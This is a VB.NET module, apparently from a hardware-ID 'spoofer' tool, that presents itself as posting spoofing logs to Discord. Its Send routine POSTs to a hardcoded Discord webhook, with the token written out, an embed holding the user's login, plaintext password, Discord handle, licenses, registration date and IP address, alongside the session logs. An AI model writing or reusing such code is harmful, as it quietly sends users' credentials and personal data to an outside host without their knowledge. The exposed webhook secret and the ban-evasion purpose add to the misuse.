Imports System.IO
Imports System.Net
Imports System.Net.Mime.MediaTypeNames
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Imports Newtonsoft.Json
Imports vente.VenteData

Module SpoofingLogsDC
    Async Sub Send()

        Dim items As String = ""

        For Each item As Object In SpooferPage.SessionList.Items
            items &= item.ToString() & "\n"
        Next
        items.Replace(Environment.NewLine, "")
        Dim DownloadLicenses As String = HomeTab.LicenseText.Text
        If DownloadLicenses = "" Then
            DownloadLicenses = "Not found any license"
        End If

        Dim logsave As String
        Dim restoresave As String
        Dim savesession As String
        If SpooferPage.SaveLogsBtn.Checked = True Then
            logsave = "Logs file created."
        Else
            logsave = "Logs file not created."
        End If

        If SpooferPage.RestorePointBtn.Checked = True Then
            restoresave = "Created restore-point"
        Else
            restoresave = "Restore-point not created"
        End If

        If SpooferPage.SaveSessionSuccessBtn.Checked = True Then
            savesession = "Saving session"
        Else
            savesession = "Not saving session"
        End If

        Dim webhookUrl As String = "https://discord.com/api/webhooks/1195440549314973786/Ig6eFjy9gnrYsa1FcsYb22L3mlDjzUL3o8o3ETT-qHnF_2U1zSsftut4WlDbJM13hkK5"
        Dim DataIgodzina As String = DateTime.Now.ToString
        Dim embedContent As String = $"{{ 
            ""embeds"":[
                {{
                    ""title"":""**{stored_username.ToUpper}** Spoofed his Computer"", 
                    ""description"":"""",
                    ""color"":35176,
                    ""fields"":[
                        {{
                            ""name"":""> **LOGS**"",
                            ""value"":""```{items}```"",
                            ""inline"":true
                        }},
                        {{
                            ""name"":""> **ACCOUNT INFORMATION**"",
                            ""value"":""> **Login:** {stored_username} \n > **Password:** {stored_password} \n > **Discord:** {stored_discord} \n > **Licenses:** {DownloadLicenses} \n > **Register Date:** {stored_regdate} \n > **IP:** {stored_ip}"",
                            ""inline"":true
                        }},
                        {{
                            ""name"":""> **SPOOFING SETTINGS**"",
                            ""value"":""> **Logs save:** {logsave} \n > **Restore-Point:** {restoresave} \n > **Session Save** {savesession}"",
                            ""inline"":true
                        }}
                    ],
                    ""image"": {{
                        ""url"":""""
                    }},
                    ""thumbnail"": {{
                        ""url"":""""
                    }},
                    ""footer"": {{
                        ""text"":""Spoofing date/time {DataIgodzina}"",
                        ""icon_url"":""""
                    }}
                }}
            ]
        }}" ' Tutaj dostosuj zawartość embeda



        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(webhookUrl), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "application/json"

        Using streamWriter As New StreamWriter(request.GetRequestStream())
            streamWriter.Write(embedContent)
            streamWriter.Flush()
            streamWriter.Close()
        End Using

        Try
            Dim response As HttpWebResponse = DirectCast(request.GetResponse(), HttpWebResponse)

        Catch ex As WebException
            MsgBox($"Wystąpił błąd: {ex.Message}")
        End Try

    End Sub
End Module
